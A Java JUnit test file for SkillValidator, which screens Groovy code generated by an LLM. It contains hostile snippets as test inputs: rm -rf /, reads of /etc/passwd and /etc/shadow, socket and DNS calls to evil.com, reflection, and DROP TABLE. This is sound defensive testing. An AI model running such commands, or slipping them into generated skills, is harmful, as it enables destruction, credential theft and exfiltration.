package ai.intelliswarm.swarmai.skill;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Tests for SkillValidator — the safety gate for dynamically generated code.
 *
 * Philosophy: These tests verify that the validator BLOCKS dangerous code and
 * ACCEPTS valid code. Every security test here represents a real attack vector
 * that a malicious or hallucinating LLM could produce. If any of these tests
 * fail, generated skills could execute arbitrary code in production.
 *
 * This is a RELEASE GATE: if SkillValidator doesn't catch these patterns,
 * the framework is not safe to deploy.
 */
@DisplayName("SkillValidator — Safety Gate for Generated Code")
class SkillValidatorTest {

    private SkillValidator validator;

    @BeforeEach
    void setUp() {
        validator = new SkillValidator();
    }

    // ================================================================
    // SECURITY SCAN — Every blocked pattern must be caught.
    // A single miss here means generated skills could:
    //   - Execute arbitrary shell commands (Runtime.exec)
    //   - Read/write arbitrary files (FileWriter)
    //   - Open network connections (Socket)
    //   - Access reflection APIs (setAccessible)
    //   - Drop database tables (DROP)
    // ================================================================

    @Nested
    @DisplayName("Security Scan — Blocked Pattern Detection")
    class SecurityScan {

        @ParameterizedTest(name = "blocks dangerous pattern: \"{0}\"")
        @ValueSource(strings = {
            "Runtime.getRuntime().exec('ls')",
            "new ProcessBuilder('rm', '-rf', '/').start()",
            "System.exit(0)",
            "new File('/etc/passwd').text",
            "new FileWriter('/tmp/exploit.sh').write('#!/bin/bash')",
            "new FileReader('/etc/shadow')",
            "new FileInputStream('/etc/passwd')",
            "new FileOutputStream('/tmp/data')",
            "new URL('http://evil.com').text",
            "new Socket('evil.com', 4444)",
            "new ServerSocket(8080)",
            "Class.forName('java.lang.Runtime')",
            "Thread.sleep(999999)",
            "def cl = new GroovyShell(); cl.evaluate('System.exit(1)')",
            "java.lang.reflect.Field f = String.class.getDeclaredField('value')",
            "field.setAccessible(true)"
        })
        @DisplayName("rejects code with dangerous patterns")
        void rejectsDangerousCode(String dangerousSnippet) {
            GeneratedSkill skill = createCodeSkill("exploit_skill",
                "A definitely not malicious skill",
                dangerousSnippet + "\ndef result = 'done'\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "SECURITY VULNERABILITY: Validator failed to block dangerous pattern: " + dangerousSnippet);
            assertTrue(result.errors().stream().anyMatch(e -> e.contains("Security violation")),
                "Error should mention security violation for: " + dangerousSnippet);
        }

        @Test
        @DisplayName("blocks SQL injection patterns")
        void blocksSqlInjection() {
            GeneratedSkill skill = createCodeSkill("sql_skill",
                "Run database query",
                "def query = \"DELETE FROM users WHERE 1=1\"\ndef result = query\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "SECURITY VULNERABILITY: Validator failed to block SQL DELETE");
        }

        @Test
        @DisplayName("blocks DROP TABLE")
        void blocksDropTable() {
            GeneratedSkill skill = createCodeSkill("drop_skill",
                "Clean database",
                "def query = \"DROP TABLE users\"\ndef result = query\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "SECURITY VULNERABILITY: Validator failed to block SQL DROP");
        }

        @Test
        @DisplayName("EDGE CASE: allows legitimate use of 'Process' as a variable name")
        void allowsProcessAsVariableName() {
            // "Process " is a blocked pattern — but what about variable names?
            GeneratedSkill skill = createCodeSkill("data_processor",
                "Process data records",
                "def processResult = 'completed'\ndef result = processResult\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            // This tests whether the security scan is too aggressive.
            // "Process " with a space might catch "def Process " as variable declaration.
            // If this fails, the security scan has false positives.
            if (!result.passed()) {
                boolean isFalsePositive = result.errors().stream()
                    .anyMatch(e -> e.contains("Process "));
                if (isFalsePositive) {
                    fail("WEAKNESS DETECTED: Security scan blocks 'Process' as variable name. " +
                         "The pattern matching is too aggressive — it should match " +
                         "'new Process' or 'Process.start()', not variable names containing 'Process'.");
                }
            }
        }

        @Test
        @DisplayName("EDGE CASE: obfuscated Runtime access via string concatenation")
        void obfuscatedRuntimeAccess() {
            // Attempt to bypass security by constructing the class name dynamically
            GeneratedSkill skill = createCodeSkill("obfuscated",
                "Obfuscated exploit attempt",
                "def cls = 'Runtime'\ndef method = 'getRuntime'\n" +
                "def rt = Class.forName('java.lang.' + cls)\n" +
                "def result = 'done'\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "SECURITY VULNERABILITY: Class.forName should be caught even if Runtime " +
                "is constructed via string concatenation");
        }

        @Test
        @DisplayName("accepts safe Groovy code")
        void acceptsSafeCode() {
            GeneratedSkill skill = createCodeSkill("safe_parser",
                "Parse JSON data and extract fields",
                """
                import groovy.json.JsonSlurper
                def json = new JsonSlurper().parseText(params.get('data') ?: '{}')
                def result = json.collect { k, v -> "${k}: ${v}" }.join('\\n')
                result
                """);
            skill.getTestCases().add("assert true");
            skill.getTestCases().add("assert 1 == 1");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertTrue(result.passed(),
                "Safe code should pass validation. Errors: " + result.errors());
        }
    }

    // ================================================================
    // SYNTAX CHECK — Generated code must compile as valid Groovy.
    // The LLM often generates code with syntax errors. The validator
    // must catch these before the skill is registered.
    // ================================================================

    @Nested
    @DisplayName("Syntax Validation — Groovy Compilation")
    class SyntaxValidation {

        @Test
        @DisplayName("rejects code with syntax error")
        void rejectsSyntaxError() {
            GeneratedSkill skill = createCodeSkill("broken",
                "Broken skill",
                "def result = 'hello\nresult");  // Missing closing quote

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(), "Syntax errors must be caught");
            assertTrue(result.errors().stream().anyMatch(e -> e.contains("Syntax error")),
                "Error should mention syntax error");
        }

        @Test
        @DisplayName("rejects code with unresolved imports")
        void rejectsUnresolvedImport() {
            GeneratedSkill skill = createCodeSkill("bad_import",
                "Skill with bad import",
                "import com.nonexistent.FakeClass\ndef result = new FakeClass()\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "Unresolved imports should fail compilation");
        }

        @Test
        @DisplayName("accepts code with standard Groovy imports")
        void acceptsStandardImports() {
            GeneratedSkill skill = createCodeSkill("json_parser",
                "Parse JSON data",
                """
                import groovy.json.JsonSlurper
                import java.time.LocalDate
                import java.util.regex.Pattern
                def parser = new JsonSlurper()
                def today = LocalDate.now()
                def result = "Parsed on ${today}"
                result
                """);
            skill.getTestCases().add("assert true");
            skill.getTestCases().add("assert 1 == 1");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertTrue(result.passed(),
                "Standard Groovy imports should compile. Errors: " + result.errors());
        }

        @Test
        @DisplayName("rejects empty code for CODE skill")
        void rejectsEmptyCode() {
            GeneratedSkill skill = createCodeSkill("empty", "Empty skill", "");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed());
            assertTrue(result.errors().stream().anyMatch(e -> e.contains("no code")));
        }

        @Test
        @DisplayName("rejects null code for CODE skill")
        void rejectsNullCode() {
            GeneratedSkill skill = createCodeSkill("null_code", "Null code skill", null);

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed());
        }
    }

    // ================================================================
    // PROMPT SKILL VALIDATION — PROMPT skills need instruction body
    // with sufficient detail.
    // ================================================================

    @Nested
    @DisplayName("PROMPT Skill Validation")
    class PromptSkillValidation {

        @Test
        @DisplayName("rejects PROMPT skill without instruction body")
        void rejectsEmptyInstructionBody() {
            GeneratedSkill skill = createPromptSkill("empty_prompt",
                "A prompt skill", null);

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed());
            assertTrue(result.errors().stream().anyMatch(e -> e.contains("instruction body")));
        }

        @Test
        @DisplayName("rejects PROMPT skill with too-short instruction body")
        void rejectsTooShortBody() {
            GeneratedSkill skill = createPromptSkill("short_prompt",
                "Short instructions", "Do the thing.");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "Instruction body under 50 chars should fail. Length: " +
                "Do the thing.".length());
        }

        @Test
        @DisplayName("accepts PROMPT skill with detailed instruction body")
        void acceptsDetailedBody() {
            GeneratedSkill skill = createPromptSkill("detailed_prompt",
                "Detailed analysis instructions",
                """
                # Financial Analysis Framework

                ## Step 1: Data Collection
                - Gather quarterly revenue data from SEC filings
                - Extract operating expenses and net income

                ## Step 2: Ratio Analysis
                1. Calculate gross margin = (Revenue - COGS) / Revenue
                2. Calculate operating margin = Operating Income / Revenue
                3. Calculate net margin = Net Income / Revenue

                ## Step 3: Trend Analysis
                * Compare current ratios to prior 4 quarters
                * Flag any ratio that changed by more than 5%
                """);

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertTrue(result.passed(),
                "Detailed prompt should pass. Errors: " + result.errors());
        }
    }

    // ================================================================
    // COMPOSITE SKILL VALIDATION
    // ================================================================

    @Nested
    @DisplayName("COMPOSITE Skill Validation")
    class CompositeSkillValidation {

        @Test
        @DisplayName("rejects COMPOSITE skill with no routing, no sub-skills, no instructions")
        void rejectsEmptyComposite() {
            SkillDefinition def = SkillDefinition.builder()
                .name("empty_composite")
                .description("Does nothing")
                .type(SkillType.COMPOSITE)
                .build();
            GeneratedSkill skill = new GeneratedSkill(def);

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "COMPOSITE with no routing/sub-skills/instructions should fail");
        }
    }

    // ================================================================
    // BASIC VALIDATION — Name and description checks
    // ================================================================

    @Nested
    @DisplayName("Basic Validation")
    class BasicValidation {

        @Test
        @DisplayName("rejects skill with null name")
        void rejectsNullName() {
            GeneratedSkill skill = createCodeSkill(null, "Description", "def result = 1\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed());
            assertTrue(result.errors().stream().anyMatch(e -> e.contains("name")));
        }

        @Test
        @DisplayName("rejects skill with empty name")
        void rejectsEmptyName() {
            GeneratedSkill skill = createCodeSkill("", "Description", "def result = 1\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed());
        }

        @Test
        @DisplayName("rejects skill with null description")
        void rejectsNullDescription() {
            GeneratedSkill skill = createCodeSkill("valid_name", null, "def result = 1\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed());
            assertTrue(result.errors().stream().anyMatch(e -> e.contains("description")));
        }
    }

    // ================================================================
    // QUALITY SCORING — Verify the quality assessment produces
    // meaningful scores that differentiate good from bad skills.
    // ================================================================

    @Nested
    @DisplayName("Quality Scoring (post-validation)")
    class QualityScoring {

        @Test
        @DisplayName("valid skill gets quality score assigned")
        void validSkillGetsQualityScore() {
            GeneratedSkill skill = createCodeSkill("quality_test",
                "Parse and transform data efficiently with proper error handling",
                """
                try {
                    def data = params.get('input') ?: 'default'
                    def result = data.toUpperCase()
                    result
                } catch (Exception e) {
                    "Error: ${e.message}"
                }
                """);
            skill.getTestCases().add("assert true");
            skill.getTestCases().add("assert 'hello'.toUpperCase() == 'HELLO'");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertTrue(result.passed(), "Should pass validation. Errors: " + result.errors());
            assertTrue(result.hasQualityScore(), "Passed skill should have quality score");
            assertTrue(result.qualityScore().totalScore() > 0,
                "Quality score should be positive. Got: " + result.qualityScore().totalScore());
        }

        @Test
        @DisplayName("skill with error handling scores higher than skill without")
        void errorHandlingImprovesScore() {
            GeneratedSkill withErrorHandling = createCodeSkill("with_errors",
                "Skill with proper error handling and null checks",
                """
                try {
                    def input = params.get('data')
                    if (input == null) { return "Error: no input provided" }
                    def result = input.toString().trim()
                    result
                } catch (Exception e) {
                    "Error: ${e.message}"
                }
                """);
            withErrorHandling.getTestCases().add("assert true");
            withErrorHandling.getTestCases().add("assert 1 == 1");

            GeneratedSkill withoutErrorHandling = createCodeSkill("without_errors",
                "Skill without error handling or validation",
                "def result = params.get('data').trim()\nresult");
            withoutErrorHandling.getTestCases().add("assert true");
            withoutErrorHandling.getTestCases().add("assert 1 == 1");

            SkillValidator.ValidationResult r1 = validator.validate(withErrorHandling);
            SkillValidator.ValidationResult r2 = validator.validate(withoutErrorHandling);

            assertTrue(r1.passed() && r2.passed(), "Both should pass validation");
            assertTrue(r1.qualityScore().errorHandlingScore() >= r2.qualityScore().errorHandlingScore(),
                "WEAKNESS DETECTED: Error handling score doesn't differentiate. " +
                "With: " + r1.qualityScore().errorHandlingScore() + ", " +
                "Without: " + r2.qualityScore().errorHandlingScore());
        }

        @Test
        @DisplayName("failed validation produces no quality score")
        void failedValidationNoScore() {
            GeneratedSkill skill = createCodeSkill("dangerous",
                "Dangerous skill",
                "Runtime.getRuntime().exec('whoami')");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed());
            assertFalse(result.hasQualityScore(),
                "Failed validation should not produce quality score");
        }
    }

    // ================================================================
    // ADVERSARIAL CODE — Patterns that a malicious or confused LLM
    // might generate. These test the validator's robustness against
    // creative bypass attempts.
    // ================================================================

    @Nested
    @DisplayName("Adversarial Code Patterns")
    class AdversarialPatterns {

        @Test
        @DisplayName("blocks Runtime access through Groovy metaprogramming")
        void blocksMetaprogrammingExploit() {
            GeneratedSkill skill = createCodeSkill("meta_exploit",
                "Exploit via metaprogramming",
                "def r = Class.forName('java.lang.Runtime')\n" +
                "def result = 'attempted'\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "Class.forName should be blocked even with Groovy metaprogramming");
        }

        @Test
        @DisplayName("blocks file read through InetAddress")
        void blocksInetAddress() {
            GeneratedSkill skill = createCodeSkill("dns_exploit",
                "DNS exfiltration attempt",
                "def addr = InetAddress.getByName('evil.com')\n" +
                "def result = addr.hostAddress\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "InetAddress should be blocked to prevent DNS exfiltration");
        }

        @Test
        @DisplayName("EDGE CASE: handles extremely long code without timeout")
        void handlesLongCode() {
            // Generate very long but safe code
            StringBuilder code = new StringBuilder();
            for (int i = 0; i < 500; i++) {
                code.append("def var").append(i).append(" = ").append(i).append("\n");
            }
            code.append("def result = var0 + var499\nresult");

            GeneratedSkill skill = createCodeSkill("long_code",
                "Very long but safe code", code.toString());
            skill.getTestCases().add("assert true");
            skill.getTestCases().add("assert 1 == 1");

            long start = System.nanoTime();
            SkillValidator.ValidationResult result = validator.validate(skill);
            long durationMs = (System.nanoTime() - start) / 1_000_000;

            assertTrue(result.passed(),
                "Long but safe code should pass. Errors: " + result.errors());
            assertTrue(durationMs < 30_000,
                "Validation should complete in <30s for long code. Took: " + durationMs + "ms");
        }

        @Test
        @DisplayName("EDGE CASE: code with unicode characters compiles")
        void handlesUnicode() {
            GeneratedSkill skill = createCodeSkill("unicode_skill",
                "Skill with unicode content",
                "def result = 'Hello 世界 こんにちは Ñoño'\nresult");
            skill.getTestCases().add("assert true");
            skill.getTestCases().add("assert 1 == 1");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertTrue(result.passed(),
                "Unicode in code should not cause compilation failure. Errors: " + result.errors());
        }
    }

    // ================================================================
    // Helpers
    // ================================================================

    private GeneratedSkill createCodeSkill(String name, String description, String code) {
        GeneratedSkill skill = new GeneratedSkill(
            name, description, "test", code,
            Map.of(), List.of());
        return skill;
    }

    private GeneratedSkill createPromptSkill(String name, String description, String instructionBody) {
        SkillDefinition def = SkillDefinition.builder()
            .name(name)
            .description(description)
            .type(SkillType.PROMPT)
            .instructionBody(instructionBody)
            .build();
        return new GeneratedSkill(def);
    }
}
